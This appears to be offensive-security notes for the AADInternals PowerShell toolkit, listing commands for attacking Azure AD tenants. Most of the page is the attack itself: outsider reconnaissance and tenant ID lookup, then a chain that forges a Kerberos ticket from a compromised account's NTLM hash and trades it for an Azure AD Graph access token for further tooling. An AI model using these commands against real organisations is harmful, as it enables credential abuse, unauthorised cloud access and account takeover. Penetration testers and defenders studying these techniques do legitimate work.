# AADInternals

## Github repo: https://github.com/Gerenios/AADInternals

## Official Documentation: https://aadinternals.com/aadkillchain/

### Commands:

 - Invoke-AADIntReconAsOutsider -Domain domain.local | Format-Table (Reconnaissance. Can be both from inside or outside the network)

 - $kerberos=NewAADIntKerberosTicket -SidString INTERNAL_AD_SID -Hash NTLM_HASH (Grab a Kerberos Ticket for the account mentioned on the INTERNAL_AD_SID, then use the NTLM hash of the compromised account)

 - Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain DOMAIN.LOCAL (Initiate an access token for Azure AD Graph from the Kerberos Ticket. This is necessary so we can pass the token to use with ROADTools or any other tool we may need to use)

 - Get-AADIntLoginInformation -Domain DOMAIN.COM (Get login information about the target domain)

 - Get-AADIntTenantID -Domain DOMAIN.COM (Get tenant ID of the domain)





